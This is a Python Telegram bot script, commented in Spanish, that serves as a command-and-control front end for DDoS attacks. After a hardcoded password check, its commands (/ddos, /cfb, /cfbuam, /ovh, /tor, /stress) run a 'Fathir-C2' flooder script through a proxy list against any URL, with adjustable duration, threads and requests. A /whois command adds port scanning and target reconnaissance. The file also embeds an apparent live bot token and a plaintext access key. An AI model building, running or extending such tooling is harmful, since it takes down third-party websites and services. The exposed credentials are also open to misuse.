import asyncio
import logging
import os
import subprocess
import requests
import time
import socket
import dns.resolver
from aiogram import Bot, Dispatcher, types
from aiogram.filters import Command
from aiogram.types import FSInputFile

# Configure logging
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

# 🔐 CONFIGURACIÓN CON TU TOKEN REAL
TELEGRAM_BOT_TOKEN = "8432455817:AAHqGcNmAovC4apOHhgpojLJnFk8-LUeQ40"
BOT_NUMBER = "01"
AUTH_TOKEN = "mihali098"

print(f"✅ Token configurado correctamente")
print(f"✅ Bot number: {BOT_NUMBER}")
print(f"🎛️ Bot iniciando...")
print(f"🔗 Bot URL: t.me/Botnetban_bot")

# Initialize bot and dispatcher
bot = Bot(token=TELEGRAM_BOT_TOKEN)
dp = Dispatcher()

# Global variables for attack parameters
s = 360  # Tiempo por defecto (300 segundos = 5 minutos)
req = 32  # Requests por defecto
thread = 8  # Threads por defecto

# Diccionario para almacenar usuarios autorizados
authorized_users = {}

# Variable para rastrear ataques activos
active_attacks = {}

# Función para verificar si el usuario está autorizado
def is_authorized(user_id):
    return user_id in authorized_users

# Función para enviar imagen del menú
async def send_menu_image(message: types.Message):
    try:
        if not os.path.exists('images'):
            os.makedirs('images')
            await message.answer("📁 Carpeta 'images' creada. Por favor añade imágenes.")
            return False
        
        image_extensions = ['.jpg', '.jpeg', '.png', '.gif', '.webp']
        images = [f for f in os.listdir('images') 
                 if os.path.isfile(os.path.join('images', f)) 
                 and any(f.lower().endswith(ext) for ext in image_extensions)]
        
        if images:
            image_path = os.path.join('images', images[0])
            photo = FSInputFile(image_path)
            await message.answer_photo(photo=photo)
            return True
        else:
            await message.answer("📷 No se encontraron imágenes en la carpeta 'images'")
            return False
            
    except Exception as e:
        logger.error(f"Error al enviar imagen: {e}")
        return False

# Start command
@dp.message(Command("start"))
async def start_command(message: types.Message):
    welcome_text = """
🔒 SISTEMA DE AUTENTICACIÓN 🔒
Bot: @Botnetban_bot

Para usar este bot, primero debes autenticarte usando el comando:

/token [clave_de_acceso]

Ejemplo: /token tu_clave

Una vez autenticado, podrás usar todos los comandos.
    """
    await message.answer(welcome_text)

# Token command
@dp.message(Command("token"))
async def token_command(message: types.Message):
    user_id = message.from_user.id
    
    if is_authorized(user_id):
        await message.answer("✅ Ya estás autenticado\n\nPuedes usar los comandos del bot normalmente.")
        return
    
    command_parts = message.text.split()
    
    if len(command_parts) < 2:
        await message.answer("❌ Formato incorrecto\n\nUso: /token [clave_de_acceso]\n\nEjemplo: /token tu_clave")
        return
    
    user_token = command_parts[1].strip()
    
    if user_token == AUTH_TOKEN:
        authorized_users[user_id] = {
            'authenticated': True,
            'username': message.from_user.username or 'Sin username',
            'user_id': user_id,
            'join_date': asyncio.get_event_loop().time()
        }
        
        auth_success_text = f"""
✅ AUTENTICACIÓN EXITOSA ✅
Bot: @Botnetban_bot

¡Bienvenido! Ahora tienes acceso a todos los comandos.

Bot ID: {BOT_NUMBER}
Usuario: @{message.from_user.username or 'N/A'}

Usa /help para ver los comandos disponibles.
        """
        
        await send_menu_image(message)
        await message.answer(auth_success_text)
        
        logger.info(f"Usuario {user_id} autenticado correctamente")
        print(f"🔓 Nuevo usuario autenticado: {user_id}")
        
    else:
        await message.answer("❌ CLAVE INCORRECTA ❌\n\nAcceso denegado. Verifica la clave e intenta nuevamente.")

# Help command - Actualizado con nuevos parámetros
@dp.message(Command("help"))
async def help_command(message: types.Message):
    user_id = message.from_user.id
    
    if not is_authorized(user_id):
        await message.answer("🔒 ACCESO RESTRINGIDO\n\nUsa el comando /token [clave] para autenticarte.")
        return
    
    help_text = f"""
🎛️ COMANDOS DISPONIBLES 🎛️
Bot: @Botnetban_bot
ID: {BOT_NUMBER}

🌐 MONITOREO:
/ping [url] - Comprobar si un sitio web está vivo
/whois [dominio] - Información DNS y IP de un sitio
/status - Estado del bot y ataques

⚡ ATAQUES (Fathir-C2):
/ddos [url] - Ataque estándar
/bot [url] - Ataque BOT
/stress [url] - Ataque STRESS
/cfb [url] - CloudFlare Bypass
/cfbuam [url] - CloudFlare UAM
/tor [url] - Ataque TOR
/ovh [url] - OVH Bypass

⚙️ CONFIG:
/t [segundos] - Tiempo (Ahora: {s}s)
/r [número] - Requests por thread (Ahora: {req})
/th [número] - Threads (Ahora: {thread})

📊 INFORMACIÓN:
/stats - Estadísticas de usuarios

🔐 AUTENTICACIÓN:
/token [clave] - Autenticarse
/logout - Cerrar sesión
/help - Ayuda
/start - Iniciar

📝 Ejemplos:
/ping https://google.com
/whois google.com
/ddos https://ejemplo.com
/t 600 - Configurar tiempo a 10 minutos
/r 64 - Configurar 64 requests
/th 16 - Configurar 16 threads
    """
    await message.answer(help_text)

# Ping command (sin cambios)
@dp.message(Command("ping"))
async def ping_command(message: types.Message):
    user_id = message.from_user.id
    
    if not is_authorized(user_id):
        await message.answer("🔒 ACCESO RESTRINGIDO\n\nUsa el comando /token [clave] para autenticarte.")
        return
    
    url = message.text.replace('/ping', '').strip()
    if not url:
        await message.answer("❌ Error: Debes especificar una URL\n\nEjemplo: /ping https://google.com")
        return
    
    # Asegurarse de que la URL tenga protocolo
    if not url.startswith(('http://', 'https://')):
        url = 'https://' + url
    
    await message.answer(f"🔍 Realizando ping a: {url}\n⏳ Por favor espera...")
    
    try:
        start_time = time.time()
        
        # Realizar la petición HTTP
        response = requests.get(
            url, 
            timeout=10,
            headers={
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
            }
        )
        
        end_time = time.time()
        response_time = round((end_time - start_time) * 1000, 2)
        
        # Determinar el estado
        if response.status_code == 200:
            status_emoji = "🟢"
            status_text = "EN LÍNEA"
        elif response.status_code < 400:
            status_emoji = "🟡"
            status_text = "FUNCIONAL"
        elif response.status_code < 500:
            status_emoji = "🟠"
            status_text = "REDIRECCIÓN O ERROR CLIENTE"
        else:
            status_emoji = "🔴"
            status_text = "ERROR SERVER"
        
        ping_result = f"""
{status_emoji} RESULTADO DEL PING {status_emoji}

🌐 URL: {url}
📊 Estado: {response.status_code} - {status_text}
⏱️ Tiempo de respuesta: {response_time} ms
📦 Tamaño: {len(response.content)} bytes
🔗 Servidor: {response.headers.get('Server', 'No especificado')}

📋 Encabezados:
• Content-Type: {response.headers.get('Content-Type', 'N/A')}
• Content-Length: {response.headers.get('Content-Length', 'N/A')}
• Date: {response.headers.get('Date', 'N/A')}
        """
        
        await message.answer(ping_result)
        
    except requests.exceptions.Timeout:
        await message.answer("❌ TIMEOUT\n\nLa conexión ha excedido el tiempo límite (10 segundos). El sitio puede estar caído o muy lento.")
    
    except requests.exceptions.ConnectionError:
        await message.answer("🔴 CONEXIÓN FALLIDA\n\nNo se pudo establecer conexión con el servidor. El sitio puede estar caído.")
    
    except requests.exceptions.TooManyRedirects:
        await message.answer("🔄 DEMASIADAS REDIRECCIONES\n\nEl sitio tiene demasiadas redirecciones.")
    
    except requests.exceptions.RequestException as e:
        await message.answer(f"❌ ERROR DE CONEXIÓN\n\nError: {str(e)}")
    
    except Exception as e:
        await message.answer(f"❌ ERROR INESPERADO\n\nError: {str(e)}")

# Whois command (sin cambios)
@dp.message(Command("whois"))
async def whois_command(message: types.Message):
    user_id = message.from_user.id
    
    if not is_authorized(user_id):
        await message.answer("🔒 ACCESO RESTRINGIDO\n\nUsa el comando /token [clave] para autenticarte.")
        return
    
    domain = message.text.replace('/whois', '').strip()
    if not domain:
        await message.answer("❌ Error: Debes especificar un dominio\n\nEjemplo: /whois google.com")
        return
    
    # Limpiar el dominio (quitar protocolo y paths)
    domain = domain.replace('http://', '').replace('https://', '').split('/')[0].split('?')[0]
    
    await message.answer(f"🔍 Analizando dominio: {domain}\n⏳ Esto puede tomar unos segundos...")
    
    try:
        # Información inicial
        whois_result = f"""
🔍 INFORMACIÓN DE DOMINIO 🔍
🌐 Dominio: {domain}

📊 INFORMACIÓN BÁSICA:
        """
        
        # 1. Resolución DNS - A Records
        try:
            a_records = []
            answers = dns.resolver.resolve(domain, 'A')
            for rdata in answers:
                a_records.append(str(rdata))
            whois_result += f"\n📍 Direcciones IP (A Records):\n" + "\n".join([f"   • {ip}" for ip in a_records])
        except Exception as e:
            whois_result += f"\n📍 Direcciones IP: ❌ Error resolviendo A records: {str(e)}"
        
        # 2. Resolución DNS - AAAA Records (IPv6)
        try:
            aaaa_records = []
            answers = dns.resolver.resolve(domain, 'AAAA')
            for rdata in answers:
                aaaa_records.append(str(rdata))
            if aaaa_records:
                whois_result += f"\n\n🌐 Direcciones IPv6 (AAAA Records):\n" + "\n".join([f"   • {ip}" for ip in aaaa_records])
        except:
            whois_result += f"\n🌐 Direcciones IPv6: No encontradas"
        
        # 3. Resolución DNS - MX Records
        try:
            mx_records = []
            answers = dns.resolver.resolve(domain, 'MX')
            for rdata in answers:
                mx_records.append(f"{rdata.preference} {rdata.exchange}")
            if mx_records:
                whois_result += f"\n\n📧 Servidores de Correo (MX Records):\n" + "\n".join([f"   • {mx}" for mx in mx_records])
        except:
            whois_result += f"\n📧 Servidores de Correo: No encontrados"
        
        # 4. Resolución DNS - NS Records
        try:
            ns_records = []
            answers = dns.resolver.resolve(domain, 'NS')
            for rdata in answers:
                ns_records.append(str(rdata))
            if ns_records:
                whois_result += f"\n\n🌍 Servidores de Nombres (NS Records):\n" + "\n".join([f"   • {ns}" for ns in ns_records])
        except:
            whois_result += f"\n🌍 Servidores de Nombres: No encontrados"
        
        # 5. Resolución DNS - CNAME Records
        try:
            cname_records = []
            answers = dns.resolver.resolve(domain, 'CNAME')
            for rdata in answers:
                cname_records.append(str(rdata))
            if cname_records:
                whois_result += f"\n\n🔗 Alias (CNAME Records):\n" + "\n".join([f"   • {cname}" for cname in cname_records])
        except:
            whois_result += f"\n🔗 Alias: No encontrados"
        
        # 6. Información de socket (puertos)
        try:
            ip_address = socket.gethostbyname(domain)
            whois_result += f"\n\n🖥️ INFORMACIÓN DE CONEXIÓN:"
            whois_result += f"\n📍 IP Principal: {ip_address}"
            
            # Intentar conexión a puertos comunes
            common_ports = [80, 443, 21, 22, 25, 53, 110, 143, 993, 995]
            open_ports = []
            
            for port in common_ports[:5]:  # Solo verificar primeros 5 puertos por tiempo
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(2)
                result = sock.connect_ex((ip_address, port))
                sock.close()
                if result == 0:
                    open_ports.append(port)
            
            if open_ports:
                whois_result += f"\n🔓 Puertos abiertos: {', '.join(map(str, open_ports))}"
            else:
                whois_result += f"\n🔒 Puertos comunes: No se encontraron abiertos"
                
        except Exception as e:
            whois_result += f"\n🖥️ Información de conexión: ❌ Error: {str(e)}"
        
        # 7. Información de geolocalización básica (usando API pública)
        try:
            ip_address = socket.gethostbyname(domain)
            geo_response = requests.get(f'http://ip-api.com/json/{ip_address}', timeout=5)
            if geo_response.status_code == 200:
                geo_data = geo_response.json()
                if geo_data['status'] == 'success':
                    whois_result += f"\n\n🗺️ INFORMACIÓN GEOGRÁFICA:"
                    whois_result += f"\n🌍 País: {geo_data.get('country', 'N/A')}"
                    whois_result += f"\n🏙️ Ciudad: {geo_data.get('city', 'N/A')}"
                    whois_result += f"\n📡 ISP: {geo_data.get('isp', 'N/A')}"
                    whois_result += f"\n🕐 Zona Horaria: {geo_data.get('timezone', 'N/A')}"
        except:
            whois_result += f"\n🗺️ Información geográfica: No disponible"
        
        # 8. Información de red
        try:
            whois_result += f"\n\n🔧 INFORMACIÓN DE RED:"
            hostname = socket.getfqdn(domain)
            whois_result += f"\n💻 Hostname: {hostname}"
            
            # Verificar si usa CloudFlare
            try:
                response = requests.get(f'https://{domain}', timeout=5, headers={'User-Agent': 'Mozilla/5.0'})
                server_header = response.headers.get('Server', '').lower()
                if 'cloudflare' in server_header or 'cloudflare' in response.headers.get('Via', '').lower():
                    whois_result += f"\n☁️ CDN: CloudFlare detectado"
                elif 'cloudfront' in server_header:
                    whois_result += f"\n☁️ CDN: AWS CloudFront detectado"
                else:
                    whois_result += f"\n☁️ CDN: No detectado"
            except:
                whois_result += f"\n☁️ CDN: No se pudo verificar"
                
        except Exception as e:
            whois_result += f"\n🔧 Información de red: ❌ Error: {str(e)}"
        
        # Si el resultado es muy largo, dividirlo en partes
        if len(whois_result) > 4000:
            parts = [whois_result[i:i+4000] for i in range(0, len(whois_result), 4000)]
            for i, part in enumerate(parts):
                await message.answer(f"📋 Parte {i+1}/{len(parts)}:\n{part}")
        else:
            await message.answer(whois_result)
            
    except dns.resolver.NXDOMAIN:
        await message.answer(f"❌ DOMINIO NO EXISTE\n\nEl dominio '{domain}' no existe o no puede ser resuelto.")
    except dns.resolver.NoNameservers:
        await message.answer(f"❌ ERROR DE SERVIDORES DE NOMBRE\n\nNo se pudo resolver el dominio '{domain}'.")
    except dns.resolver.Timeout:
        await message.answer(f"❌ TIMEOUT DNS\n\nLa resolución DNS ha excedido el tiempo límite para '{domain}'.")
    except Exception as e:
        await message.answer(f"❌ ERROR INESPERADO\n\nError al analizar el dominio '{domain}': {str(e)}")

# Status command - Actualizado
@dp.message(Command("status"))
async def status_command(message: types.Message):
    user_id = message.from_user.id
    
    if not is_authorized(user_id):
        await message.answer("🔒 ACCESO RESTRINGIDO\n\nUsa el comando /token [clave] para autenticarte.")
        return
    
    attacks_count = len(active_attacks)
    users_count = len(authorized_users)
    
    active_attacks_info = ""
    if active_attacks:
        for attack_id, attack_data in list(active_attacks.items())[:5]:
            active_attacks_info += f"• {attack_data['method']} -> {attack_data['target']}\n"
        if len(active_attacks) > 5:
            active_attacks_info += f"• ... y {len(active_attacks) - 5} más\n"
    else:
        active_attacks_info = "No hay ataques activos\n"
    
    status_text = f"""
📊 ESTADO DEL BOT 📊
Bot: @Botnetban_bot
ID: {BOT_NUMBER}

🟢 ESTADO GENERAL:
• Bot: OPERATIVO
• Usuarios activos: {users_count}
• Ataques activos: {attacks_count}
• Tiempo configurado: {s} segundos
• Requests: {req} por thread
• Threads: {thread}

⚡ ATAQUES ACTIVOS:
{active_attacks_info}
🖥️ SISTEMA:
• Servidor: OPERATIVO
• Fathir-C2: CONECTADO
• Proxy list: DISPONIBLE

💾 RECURSOS:
• Comandos disponibles: 14
• Máximo tiempo: 3600s
• Máximo threads: 64
• Máximo requests: 128
    """
    await message.answer(status_text)

# Time setting command
@dp.message(Command("t"))
async def time_command(message: types.Message):
    user_id = message.from_user.id
    
    if not is_authorized(user_id):
        await message.answer("🔒 ACCESO RESTRINGIDO\n\nUsa el comando /token [clave] para autenticarte.")
        return
    
    global s
    try:
        new_time = int(message.text.replace('/t', '').strip())
        if new_time > 3600:
            await message.answer("❌ Error: El tiempo máximo es 3600 segundos (1 hora)")
            return
        s = new_time
        await message.answer(f"⏰ Tiempo configurado: {s} segundos ⏰")
    except ValueError:
        await message.answer("❌ Error: Usa /t 60")

# Requests setting command
@dp.message(Command("r"))
async def requests_command(message: types.Message):
    user_id = message.from_user.id
    
    if not is_authorized(user_id):
        await message.answer("🔒 ACCESO RESTRINGIDO\n\nUsa el comando /token [clave] para autenticarte.")
        return
    
    global req
    try:
        new_req = int(message.text.replace('/r', '').strip())
        if new_req > 128:
            await message.answer("❌ Error: El máximo de requests es 128")
            return
        if new_req < 1:
            await message.answer("❌ Error: El mínimo de requests es 1")
            return
        req = new_req
        await message.answer(f"📊 Requests configurados: {req} por thread 📊")
    except ValueError:
        await message.answer("❌ Error: Usa /r 64")

# Threads setting command
@dp.message(Command("th"))
async def threads_command(message: types.Message):
    user_id = message.from_user.id
    
    if not is_authorized(user_id):
        await message.answer("🔒 ACCESO RESTRINGIDO\n\nUsa el comando /token [clave] para autenticarte.")
        return
    
    global thread
    try:
        new_thread = int(message.text.replace('/th', '').strip())
        if new_thread > 64:
            await message.answer("❌ Error: El máximo de threads es 64")
            return
        if new_thread < 1:
            await message.answer("❌ Error: El mínimo de threads es 1")
            return
        thread = new_thread
        await message.answer(f"⚡ Threads configurados: {thread} ⚡")
    except ValueError:
        await message.answer("❌ Error: Usa /th 16")

# Función de ataque con Fathir-C2
def fathir_attack(target_url, attack_id, method_name="STANDARD"):
    try:
        # Limpiar la URL para obtener solo el host
        clean_url = target_url.replace('http://', '').replace('https://', '').split('/')[0].split('?')[0]
        
        # Construir el comando según la estructura: node black.js host time req thread proxy.txt
        command = f'cd ~/Fathir-C2/lib/cache && node black.js {clean_url} {s} {req} {thread} proxy.txt'
        print(f"🔧 Ejecutando Fathir-C2: {command}")
        
        result = subprocess.run(command, shell=True, capture_output=True, text=True, timeout=s+10)
        
        if result.returncode == 0:
            print(f"✅ Ataque {method_name} ejecutado exitosamente")
            return f"✅ Ataque {method_name} completado\nOutput: {result.stdout[-500:] if result.stdout else 'Sin output'}"
        else:
            error_msg = f"❌ Error en ataque {method_name}: {result.stderr}"
            print(error_msg)
            return error_msg
            
    except subprocess.TimeoutExpired:
        print(f"⏰ Ataque {method_name} finalizado (tiempo completado)")
        return f"⏰ Ataque {method_name} finalizado después de {s} segundos"
    except Exception as e:
        error_msg = f"❌ Error inesperado en {method_name}: {str(e)}"
        print(error_msg)
        return error_msg
    finally:
        if attack_id in active_attacks:
            del active_attacks[attack_id]

# Función genérica para ejecutar ataques
async def run_fathir_attack(message: types.Message, method: str, description: str):
    user_id = message.from_user.id
    
    if not is_authorized(user_id):
        await message.answer("🔒 ACCESO RESTRINGIDO\n\nUsa el comando /token [clave] para autenticarte.")
        return
    
    url = message.text.replace(f'/{method.lower()}', '').strip()
    if not url:
        await message.answer(f"❌ Error: /{method.lower()} https://ejemplo.com")
        return
    
    attack_id = f"{method}_{user_id}_{int(time.time())}"
    active_attacks[attack_id] = {
        'method': method,
        'target': url,
        'user_id': user_id,
        'start_time': time.time(),
        'duration': s
    }
    
    attack_info = f"""
⚡ INICIANDO ATAQUE FATHIR-C2 ⚡
Bot: @Botnetban_bot
METHOD: {method}
Target: {url}
Time: {s}s
Requests: {req} por thread
Threads: {thread}
ID: {attack_id[-8:]}
    """
    await message.answer(attack_info)
    
    try:
        loop = asyncio.get_event_loop()
        result = await loop.run_in_executor(None, fathir_attack, url, attack_id, method)
        await message.answer(result)
    except Exception as e:
        if attack_id in active_attacks:
            del active_attacks[attack_id]
        await message.answer(f"❌ Error ejecutando ataque {method}: {str(e)}")

# Comandos de ataque (todos usan la misma función con Fathir-C2)
@dp.message(Command("ddos"))
async def ddos_command(message: types.Message):
    await run_fathir_attack(message, "DDOS", "Ataque estándar")

@dp.message(Command("bot"))
async def bot_command(message: types.Message):
    await run_fathir_attack(message, "BOT", "Ataque BOT")

@dp.message(Command("stress"))
async def stress_command(message: types.Message):
    await run_fathir_attack(message, "STRESS", "Ataque STRESS")

@dp.message(Command("cfb"))
async def cfb_command(message: types.Message):
    await run_fathir_attack(message, "CFB", "CloudFlare Bypass")

@dp.message(Command("cfbuam"))
async def cfbuam_command(message: types.Message):
    await run_fathir_attack(message, "CFBUAM", "CloudFlare UAM")

@dp.message(Command("tor"))
async def tor_command(message: types.Message):
    await run_fathir_attack(message, "TOR", "Ataque TOR")

@dp.message(Command("ovh"))
async def ovh_command(message: types.Message):
    await run_fathir_attack(message, "OVH", "OVH Bypass")

# Logout command (sin cambios)
@dp.message(Command("logout"))
async def logout_command(message: types.Message):
    user_id = message.from_user.id
    if user_id in authorized_users:
        attacks_to_remove = [aid for aid, data in active_attacks.items() if data['user_id'] == user_id]
        for attack_id in attacks_to_remove:
            del active_attacks[attack_id]
        
        del authorized_users[user_id]
        await message.answer("🔓 Sesión cerrada\n\nTodos tus ataques han sido detenidos.")
        print(f"🔓 Usuario {user_id} cerró sesión")
    else:
        await message.answer("❌ No autenticado")

# Stats command (sin cambios)
@dp.message(Command("stats"))
async def stats_command(message: types.Message):
    user_id = message.from_user.id
    
    if not is_authorized(user_id):
        await message.answer("🔒 ACCESO RESTRINGIDO\n\nUsa el comando /token [clave] para autenticarte.")
        return
    
    total_attacks = len(active_attacks)
    user_attacks = len([aid for aid, data in active_attacks.items() if data['user_id'] == user_id])
    
    stats_text = f"""
📊 ESTADÍSTICAS 📊
Bot: @Botnetban_bot
ID: {BOT_NUMBER}

👥 USUARIOS:
Usuarios autenticados: {len(authorized_users)}
Tiempo configurado: {s}s
Requests: {req} por thread
Threads: {thread}

⚡ ATAQUES:
Ataques activos totales: {total_attacks}
Tus ataques activos: {user_attacks}

👤 TU INFORMACIÓN:
Tu ID: {user_id}
Tu username: @{message.from_user.username or 'N/A'}
    """
    await message.answer(stats_text)

# Unknown commands (sin cambios)
@dp.message()
async def handle_unknown(message: types.Message):
    user_id = message.from_user.id
    if is_authorized(user_id) and message.text and message.text.startswith('/'):
        await message.answer("❌ Comando no reconocido\nUsa /help para ver los comandos disponibles.")

# Tarea de limpieza (sin cambios)
async def cleanup_task():
    while True:
        await asyncio.sleep(60)
        current_time = time.time()
        attacks_to_remove = []
        for attack_id, attack_data in active_attacks.items():
            if current_time - attack_data['start_time'] > attack_data['duration'] + 60:
                attacks_to_remove.append(attack_id)
        
        for attack_id in attacks_to_remove:
            del active_attacks[attack_id]
            print(f"🧹 Ataque {attack_id} removido por limpieza")

# Main function (sin cambios)
async def main():
    print("🎛️ Bot iniciado correctamente")
    print(f"🔐 Token auth: [OCULTO]")
    print(f"⏰ Tiempo: {s}s")
    print(f"📊 Requests: {req} por thread")
    print(f"⚡ Threads: {thread}")
    print("🤖 Esperando mensajes...")
    
    asyncio.create_task(cleanup_task())
    await dp.start_polling(bot)

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print("\n🛑 Bot detenido")
    except Exception as e:
        print(f"❌ Error: {e}")
